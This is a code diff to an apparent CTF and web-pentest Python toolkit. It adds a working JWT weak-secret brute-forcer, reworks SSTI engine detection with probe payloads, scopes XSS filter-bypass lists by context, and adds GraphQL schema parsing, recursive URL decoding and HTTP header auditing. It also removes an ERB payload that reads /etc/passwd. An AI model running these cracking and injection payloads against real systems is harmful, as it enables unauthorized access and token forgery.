@@ -75,6 +75,7 @@ class WebTools:
             "host_header_attack": "Host header attack payloads",
             # GraphQL
             "graphql_introspection": "GraphQL introspection query",
+            "graphql_parse_schema": "Parse GraphQL introspection response",
             "graphql_injection": "GraphQL injection payloads",
             # WebSocket
             "websocket_test": "WebSocket security test payloads",
@@ -86,6 +87,9 @@ class WebTools:
             "pdf_ssrf": "PDF generation SSRF payloads",
             "upload_bypass": "File upload bypass techniques",
             "race_condition": "Race condition exploit templates",
+            # URL / Encoding
+            "url_decode_recursive": "Recursively URL-decode multi-encoded strings",
+            "http_header_analyze": "Analyze HTTP headers for security issues",
         }
 
     # === SQL Injection ===
@@ -417,12 +421,12 @@ class WebTools:
 
         try:
             # Decode header
-            header_padded = parts[0] + '=' * (4 - len(parts[0]) % 4)
+            header_padded = parts[0] + '=' * (-len(parts[0]) % 4)
             header = json.loads(base64.urlsafe_b64decode(header_padded))
             result.append(f"Header: {json.dumps(header, indent=2)}")
 
             # Decode payload
-            payload_padded = parts[1] + '=' * (4 - len(parts[1]) % 4)
+            payload_padded = parts[1] + '=' * (-len(parts[1]) % 4)
             payload = json.loads(base64.urlsafe_b64decode(payload_padded))
             result.append(f"\nPayload: {json.dumps(payload, indent=2)}")
 
@@ -451,7 +455,7 @@ class WebTools:
 
         return '\n'.join(result)
 
-    def jwt_forge(self, token: str, payload_changes: dict = None, attack: str = "none") -> str:
+    def jwt_forge(self, token: str, payload_changes: dict | None = None, attack: str = "none") -> str:
         """Forge JWT token with none algorithm or other attacks"""
         parts = token.split('.')
         if len(parts) != 3:
@@ -459,10 +463,10 @@ class WebTools:
 
         try:
             # Decode original
-            header_padded = parts[0] + '=' * (4 - len(parts[0]) % 4)
+            header_padded = parts[0] + '=' * (-len(parts[0]) % 4)
             header = json.loads(base64.urlsafe_b64decode(header_padded))
 
-            payload_padded = parts[1] + '=' * (4 - len(parts[1]) % 4)
+            payload_padded = parts[1] + '=' * (-len(parts[1]) % 4)
             payload = json.loads(base64.urlsafe_b64decode(payload_padded))
 
             result = ["JWT Forging:", "-" * 50]
@@ -505,8 +509,8 @@ class WebTools:
 
         return '\n'.join(result)
 
-    def jwt_crack(self, algorithm: str = "HS256") -> str:
-        """Common JWT secrets wordlist"""
+    def jwt_crack(self, token: str = "", algorithm: str = "HS256") -> str:
+        """Brute-force JWT secret against common weak secrets"""
         weak_secrets = [
             "secret", "password", "123456", "admin", "key", "private",
             "jwt", "token", "auth", "test", "supersecret", "changeme",
@@ -522,18 +526,49 @@ class WebTools:
             "your-256-bit-secret", "my_super_secret_key_123",
         ]
 
-        result = ["JWT Secret Cracking Wordlist:", "-" * 50]
+        result = ["JWT Secret Cracking:", "-" * 50]
         result.append(f"Algorithm: {algorithm}")
-        result.append("")
-        result.append("Common weak secrets:")
-        for s in weak_secrets:
-            result.append(f"  {s}")
 
-        result.append("")
-        result.append("Tools for JWT cracking:")
-        result.append("  - jwt_tool: python3 jwt_tool.py <token> -C -d wordlist.txt")
-        result.append("  - hashcat: hashcat -m 16500 jwt.txt wordlist.txt")
-        result.append("  - john: john --wordlist=wordlist.txt jwt.txt")
+        # If token provided, actually attempt to crack it
+        if token and token.count('.') == 2:
+            parts = token.split('.')
+            signing_input = f"{parts[0]}.{parts[1]}".encode()
+            target_sig = parts[2]
+
+            alg_map = {
+                "HS256": "sha256", "HS384": "sha384", "HS512": "sha512",
+            }
+            hash_name = alg_map.get(algorithm)
+            if not hash_name:
+                result.append(f"Cannot crack {algorithm} — only HMAC algorithms supported")
+                return '\n'.join(result)
+
+            result.append(f"Trying {len(weak_secrets)} common secrets...")
+            found = None
+            tried = 0
+            for secret in weak_secrets:
+                sig = base64.urlsafe_b64encode(
+                    hmac.new(secret.encode(), signing_input, hash_name).digest()
+                ).decode().rstrip('=')
+                tried += 1
+                if sig == target_sig:
+                    found = secret
+                    break
+
+            if found:
+                result.append(f"\n[!] SECRET FOUND: '{found}'  (tried {tried} secrets)")
+                result.append(f"    Use this to forge tokens via jwt_forge()")
+            else:
+                result.append(f"\n[-] No match in {tried} common secrets")
+                result.append("    Try a larger wordlist with:")
+                result.append("    hashcat -m 16500 jwt.txt wordlist.txt")
+                result.append("    john --wordlist=wordlist.txt jwt.txt")
+        else:
+            result.append("")
+            result.append("No token provided — returning wordlist:")
+            for s in weak_secrets:
+                result.append(f"  {s}")
+            result.append("\nProvide a token to auto-crack: jwt_crack(token='ey...')")
 
         return '\n'.join(result)
 
@@ -620,8 +655,6 @@ token = jwt.encode(payload, public_key, algorithm='HS256')
     def php_serialize(self, data: dict) -> str:
         """Generate PHP serialized payload"""
         # Simple PHP serialization for common types
-        result = []
-
         def serialize_value(val):
             if val is None:
                 return "N;"
@@ -1563,12 +1596,22 @@ $phar->stopBuffering();
             ]
         }
 
-        result = ["XSS Filter Bypass Techniques:", "-" * 50]
+        result = [f"XSS Filter Bypass ({context} context):", "-" * 50]
+
+        # Filter categories by context
+        context_relevant = {
+            "html": bypasses.keys(),
+            "js": ["encoding_bypass", "no_parentheses", "comment_bypass"],
+            "attribute": ["encoding_bypass", "case_bypass", "no_spaces", "no_parentheses"],
+            "url": ["encoding_bypass", "double_encoding"],
+        }
+        relevant = context_relevant.get(context, bypasses.keys())
 
         for category, payloads in bypasses.items():
-            result.append(f"\n=== {category.upper()} ===")
-            for p in payloads:
-                result.append(f"  {p}")
+            if category in relevant:
+                result.append(f"\n=== {category.upper()} ===")
+                for p in payloads:
+                    result.append(f"  {p}")
 
         result.append("\n=== ADDITIONAL TECHNIQUES ===")
         result.append("  - Use data: URIs")
@@ -1714,63 +1757,154 @@ $phar->stopBuffering();
 
     # === SSTI ===
 
-    def ssti_identify(self) -> str:
-        """Identify template engine for SSTI"""
-        detection_payloads = {
-            "initial": {
-                "${7*7}": "49 = Expression Language / Freemarker / Thymeleaf",
-                "{{7*7}}": "49 = Jinja2 / Twig / Nunjucks / AngularJS",
-                "{{7*'7'}}": "7777777 = Jinja2 | 49 = Twig",
-                "#{7*7}": "49 = Ruby ERB / Java EL",
-                "<%= 7*7 %>": "49 = Ruby ERB / EJS",
-                "${{7*7}}": "49 = Velocity",
-                "{7*7}": "49 = Smarty / Mako",
-                "{{= 7*7}}": "49 = Handlebars (custom config)",
-                "*{7*7}": "49 = Thymeleaf",
-            }
-        }
-
-        engine_fingerprints = {
+    def ssti_identify(self, response_text: str = "",
+                      payload_results: str = "") -> str:
+        """
+        Identify template engine for SSTI.
+        If response_text is provided, analyze it for template engine signatures.
+        If payload_results is provided (format: 'payload1=result1;payload2=result2'),
+        determine the engine from actual test results.
+        Otherwise, return detection guide with payloads to try.
+        """
+        # Engine signature patterns found in error messages or responses
+        engine_signatures = {
             "jinja2": [
-                "{{config}}",
-                "{{self.__class__}}",
-                "{{request.application}}",
+                r"jinja2\.", r"jinja2\.exceptions",
+                r"UndefinedError", r"TemplateSyntaxError",
+                r"<class '.*\.__class__.*'>",
+                r"<Config \{", r"<Flask ",
             ],
             "twig": [
-                "{{_self.env}}",
-                "{{app.request}}",
+                r"Twig_Error", r"Twig\\Error",
+                r"The function .* does not exist",
+                r"Unexpected token .* of value",
             ],
             "freemarker": [
-                "${.version}",
-                "${.current_template_name}",
+                r"freemarker\.", r"FreeMarker template error",
+                r"Expression .* is undefined",
+                r"ParseException",
             ],
             "velocity": [
-                "$class.inspect('java.lang.Runtime')",
-            ],
-            "smarty": [
-                "{$smarty.version}",
+                r"org\.apache\.velocity",
+                r"VelocityException",
+                r"ResourceNotFoundException",
             ],
             "mako": [
-                "${self.module}",
+                r"mako\.", r"MakoException",
+                r"TopLevelLookupException",
+                r"<%def name=",
+            ],
+            "smarty": [
+                r"Smarty_", r"SmartyException",
+                r"Smarty error:",
             ],
             "erb": [
-                "<%= self.class %>",
-                "<%= File.open('/etc/passwd').read %>",
-            ]
+                r"ERB\b", r"SyntaxError.*erb",
+                r"#<.*:0x[0-9a-f]+>",
+            ],
+            "pebble": [
+                r"com\.mitchellbosecke\.pebble",
+                r"PebbleException",
+            ],
+            "nunjucks": [
+                r"nunjucks", r"Template render error",
+            ],
+            "handlebars": [
+                r"handlebars", r"Parse error",
+                r"Missing helper:",
+            ],
         }
 
-        result = ["SSTI Template Engine Identification:", "-" * 50]
+        # If response_text provided, analyze it
+        if response_text:
+            result = ["SSTI Engine Detection Results:", "-" * 50]
+            detected = []
+            for engine, patterns in engine_signatures.items():
+                matches = []
+                for pat in patterns:
+                    found = re.findall(pat, response_text, re.IGNORECASE)
+                    if found:
+                        matches.extend(found)
+                if matches:
+                    detected.append((engine, matches))
 
+            if detected:
+                for engine, matches in detected:
+                    result.append(f"\n[DETECTED] {engine.upper()}")
+                    for m in matches[:3]:
+                        result.append(f"  Match: {m[:80]}")
+            else:
+                # Check for computed values
+                checks = [
+                    ("49" in response_text, "Arithmetic evaluated (49 found)"),
+                    ("7777777" in response_text, "String repeat → likely Jinja2"),
+                    ("object" in response_text.lower(), "Object reference leaked"),
+                ]
+                for cond, msg in checks:
+                    if cond:
+                        result.append(f"  [HINT] {msg}")
+                if not any(c for c, _ in checks):
+                    result.append("  No engine signatures detected in response")
+                    result.append("  Try more specific payloads below")
+
+            return '\n'.join(result)
+
+        # If payload_results provided, analyze test outcomes
+        if payload_results:
+            result = ["SSTI Engine Identification from Test Results:", "-" * 50]
+            pairs = [p.strip() for p in payload_results.split(";") if "=" in p]
+            engine_scores: dict[str, int] = {}
+
+            for pair in pairs:
+                payload, resp = pair.split("=", 1)
+                payload, resp = payload.strip(), resp.strip()
+
+                if "49" in resp:
+                    if "{{7*7}}" in payload:
+                        for e in ["jinja2", "twig", "nunjucks"]:
+                            engine_scores[e] = engine_scores.get(e, 0) + 2
+                    if "${7*7}" in payload:
+                        for e in ["freemarker", "velocity", "thymeleaf"]:
+                            engine_scores[e] = engine_scores.get(e, 0) + 2
+                    if "#{7*7}" in payload:
+                        for e in ["erb", "java_el"]:
+                            engine_scores[e] = engine_scores.get(e, 0) + 2
+                    if "{7*7}" in payload and "{{" not in payload:
+                        for e in ["smarty", "mako"]:
+                            engine_scores[e] = engine_scores.get(e, 0) + 2
+                if "7777777" in resp and "{{7*'7'}}" in payload:
+                    engine_scores["jinja2"] = engine_scores.get("jinja2", 0) + 5
+                    engine_scores.pop("twig", None)
+                if resp == "49" and "{{7*'7'}}" in payload:
+                    engine_scores["twig"] = engine_scores.get("twig", 0) + 5
+                    engine_scores.pop("jinja2", None)
+
+            if engine_scores:
+                ranked = sorted(engine_scores.items(), key=lambda x: -x[1])
+                result.append(f"\nMost likely: {ranked[0][0].upper()}")
+                for eng, score in ranked:
+                    result.append(f"  {eng}: confidence {score}")
+            else:
+                result.append("No engine identified from provided results")
+
+            return '\n'.join(result)
+
+        # Default: return detection guide
+        detection_payloads = {
+            "${7*7}": "49 = Expression Language / Freemarker / Thymeleaf",
+            "{{7*7}}": "49 = Jinja2 / Twig / Nunjucks / AngularJS",
+            "{{7*'7'}}": "7777777 = Jinja2 | 49 = Twig",
+            "#{7*7}": "49 = Ruby ERB / Java EL",
+            "<%= 7*7 %>": "49 = Ruby ERB / EJS",
+            "${{7*7}}": "49 = Velocity",
+            "{7*7}": "49 = Smarty / Mako",
+        }
+
+        result = ["SSTI Template Engine Identification Guide:", "-" * 50]
         result.append("\n=== STEP 1: INITIAL DETECTION ===")
-        result.append("Try these payloads to detect SSTI:")
-        for payload, indication in detection_payloads["initial"].items():
+        result.append("Try these payloads and pass results back:")
+        for payload, indication in detection_payloads.items():
             result.append(f"  {payload} → {indication}")
-
-        result.append("\n=== STEP 2: ENGINE FINGERPRINTING ===")
-        for engine, payloads in engine_fingerprints.items():
-            result.append(f"\n{engine.upper()}:")
-            for p in payloads:
-                result.append(f"  {p}")
 
         result.append("\n=== DECISION TREE ===")
         result.append("  {{7*7}} returns 49?")
@@ -1778,6 +1912,7 @@ $phar->stopBuffering();
         result.append("    → Yes: {{7*'7'}} returns 49? → Twig")
         result.append("  ${7*7} returns 49? → FreeMarker / Velocity / Thymeleaf")
         result.append("  #{7*7} returns 49? → Ruby ERB")
+        result.append("\nTip: Pass response text via response_text param for auto-detection")
 
         return '\n'.join(result)
 
@@ -1927,7 +2062,7 @@ $phar->stopBuffering();
         return '\n'.join(result)
 
     def csrf_poc_generate(self, method: str = "POST", url: str = "TARGET_URL",
-                          params: dict = None) -> str:
+                          params: dict | None = None) -> str:
         """Generate CSRF PoC HTML"""
         if params is None:
             params = {"param1": "value1", "param2": "value2"}
@@ -2223,6 +2358,93 @@ SMUGGLED'''
         result.append("\n=== DETECT GRAPHQL ===")
         result.append("  POST to /graphql with: {\"query\":\"{__typename}\"}")
         result.append("  Common endpoints: /graphql, /api/graphql, /v1/graphql")
+
+        return '\n'.join(result)
+
+    def graphql_parse_schema(self, introspection_json: str = "") -> str:
+        """
+        Parse GraphQL introspection response JSON to extract types, queries,
+        mutations and their arguments. Useful for CTF to find hidden queries.
+        """
+        if not introspection_json:
+            return ("Pass the introspection response JSON to parse.\n"
+                    "Use graphql_introspection to get the query first.")
+
+        try:
+            data = json.loads(introspection_json)
+        except json.JSONDecodeError as e:
+            return f"Invalid JSON: {e}"
+
+        # Navigate to schema data
+        schema = data.get("data", data).get("__schema", data.get("__schema"))
+        if not schema:
+            return "No __schema found in response"
+
+        result = ["GraphQL Schema Analysis:", "=" * 50]
+
+        # Extract query/mutation root types
+        query_type_name = schema.get("queryType", {}).get("name", "Query")
+        mutation_type_name = (schema.get("mutationType") or {}).get("name")
+
+        types = schema.get("types", [])
+        user_types = []
+        queries = []
+        mutations = []
+
+        for t in types:
+            name = t.get("name", "")
+            kind = t.get("kind", "")
+            fields = t.get("fields") or []
+
+            # Skip internal GraphQL types
+            if name.startswith("__"):
+                continue
+
+            if name == query_type_name:
+                for f in fields:
+                    args = [f"{a['name']}:{(a.get('type') or {}).get('name', '?')}"
+                            for a in (f.get("args") or [])]
+                    ret_type = (f.get("type") or {}).get("name", "?")
+                    queries.append((f["name"], args, ret_type))
+            elif name == mutation_type_name:
+                for f in fields:
+                    args = [f"{a['name']}:{(a.get('type') or {}).get('name', '?')}"
+                            for a in (f.get("args") or [])]
+                    mutations.append((f["name"], args))
+            elif kind == "OBJECT" and not name.startswith("__"):
+                field_names = [f["name"] for f in fields[:10]]
+                user_types.append((name, kind, field_names))
+
+        # Display queries
+        if queries:
+            result.append(f"\n[QUERIES] ({len(queries)} found)")
+            for name, args, ret in queries:
+                arg_str = f"({', '.join(args)})" if args else "()"
+                result.append(f"  {name}{arg_str} → {ret}")
+
+        # Display mutations
+        if mutations:
+            result.append(f"\n[MUTATIONS] ({len(mutations)} found)")
+            for name, args in mutations:
+                arg_str = f"({', '.join(args)})" if args else "()"
+                result.append(f"  {name}{arg_str}")
+
+        # Display user-defined types
+        if user_types:
+            result.append(f"\n[TYPES] ({len(user_types)} user-defined)")
+            for name, kind, fields in user_types:
+                result.append(f"  {name}: {', '.join(fields)}")
+
+        # Security hints
+        result.append("\n[SECURITY NOTES]")
+        for name, args, ret in queries:
+            nl = name.lower()
+            if any(w in nl for w in ["admin", "flag", "secret", "private", "internal"]):
+                result.append(f"  [!] Interesting query: {name}")
+        for name, kind, fields in user_types:
+            for f in fields:
+                if any(w in f.lower() for w in ["password", "token", "secret", "flag", "key"]):
+                    result.append(f"  [!] Sensitive field: {name}.{f}")
 
         return '\n'.join(result)
 
@@ -2586,5 +2808,116 @@ def handleResponse(req, interesting):
         result.append("  1. Use 'Last-Byte Sync' for precise timing")
         result.append("  2. Test with multiple connections")
         result.append("  3. Watch for partial successes")
+
+        return '\n'.join(result)
+
+    # === URL / Encoding Utilities ===
+
+    def url_decode_recursive(self, encoded: str, max_rounds: int = 10) -> str:
+        """
+        Recursively URL-decode a string until no more encoding is found.
+        Essential for CTF challenges with multi-layer encoded payloads.
+        """
+        result = ["URL Recursive Decode:", "-" * 50]
+        current = encoded
+        round_num = 0
+
+        while round_num < max_rounds:
+            decoded = urllib.parse.unquote(current)
+            if decoded == current:
+                break
+            round_num += 1
+            result.append(f"  Round {round_num}: {decoded[:200]}")
+            current = decoded
+
+        result.insert(1, f"  Input:  {encoded[:200]}")
+        result.append(f"  Final:  {current[:200]}")
+        result.append(f"  Rounds: {round_num}")
+
+        # Also try base64 decode on final result
+        try:
+            b64 = base64.b64decode(current).decode("utf-8", errors="replace")
+            if b64.isprintable() and len(b64) > 2:
+                result.append(f"  Base64: {b64[:200]}")
+        except Exception:
+            pass
+
+        return '\n'.join(result)
+
+    def http_header_analyze(self, headers: str) -> str:
+        """
+        Analyze HTTP response headers for security misconfigurations.
+        Input: raw headers as text (one per line, 'Name: Value' format).
+        """
+        if not headers.strip():
+            return "Pass HTTP response headers (one per line) for analysis."
+
+        result = ["HTTP Security Header Analysis:", "=" * 50]
+        parsed: dict[str, str] = {}
+
+        for line in headers.strip().split("\n"):
+            if ":" in line:
+                name, _, value = line.partition(":")
+                parsed[name.strip().lower()] = value.strip()
+
+        # Security headers to check
+        security_checks = {
+            "strict-transport-security": {
+                "name": "HSTS",
+                "missing": "[WARN] No HSTS — vulnerable to SSL stripping",
+                "check": lambda v: "[OK] HSTS enabled" if "max-age" in v.lower() else "[WARN] HSTS present but no max-age",
+            },
+            "content-security-policy": {
+                "name": "CSP",
+                "missing": "[WARN] No CSP — XSS risk increased",
+                "check": lambda v: "[WARN] CSP uses unsafe-inline" if "unsafe-inline" in v else (
+                    "[WARN] CSP uses unsafe-eval" if "unsafe-eval" in v else "[OK] CSP configured"),
+            },
+            "x-frame-options": {
+                "name": "X-Frame-Options",
+                "missing": "[WARN] No X-Frame-Options — clickjacking risk",
+                "check": lambda v: "[OK] Clickjacking protection" if v.upper() in ("DENY", "SAMEORIGIN") else f"[INFO] Value: {v}",
+            },
+            "x-content-type-options": {
+                "name": "X-Content-Type-Options",
+                "missing": "[WARN] No X-Content-Type-Options",
+                "check": lambda v: "[OK] nosniff enabled" if "nosniff" in v.lower() else f"[INFO] Value: {v}",
+            },
+            "x-xss-protection": {
+                "name": "X-XSS-Protection",
+                "missing": "[INFO] No X-XSS-Protection (deprecated but still useful)",
+                "check": lambda v: "[OK] XSS filter enabled" if "1" in v else "[INFO] XSS filter disabled",
+            },
+            "access-control-allow-origin": {
+                "name": "CORS",
+                "missing": None,
+                "check": lambda v: "[WARN] CORS allows all origins (*)" if v == "*" else f"[INFO] CORS: {v}",
+            },
+        }
+
+        for header, info in security_checks.items():
+            if header in parsed:
+                result.append(f"  {info['check'](parsed[header])}")
+            elif info["missing"]:
+                result.append(f"  {info['missing']}")
+
+        # Check for info leakage
+        leaky = ["server", "x-powered-by", "x-aspnet-version", "x-aspnetmvc-version"]
+        leaked = [(h, parsed[h]) for h in leaky if h in parsed]
+        if leaked:
+            result.append("\n[INFO LEAKAGE]")
+            for h, v in leaked:
+                result.append(f"  {h}: {v}")
+
+        # Check cookies
+        if "set-cookie" in parsed:
+            cookie = parsed["set-cookie"]
+            result.append("\n[COOKIE ANALYSIS]")
+            if "httponly" not in cookie.lower():
+                result.append("  [WARN] Cookie missing HttpOnly flag")
+            if "secure" not in cookie.lower():
+                result.append("  [WARN] Cookie missing Secure flag")
+            if "samesite" not in cookie.lower():
+                result.append("  [WARN] Cookie missing SameSite attribute")
 
         return '\n'.join(result)
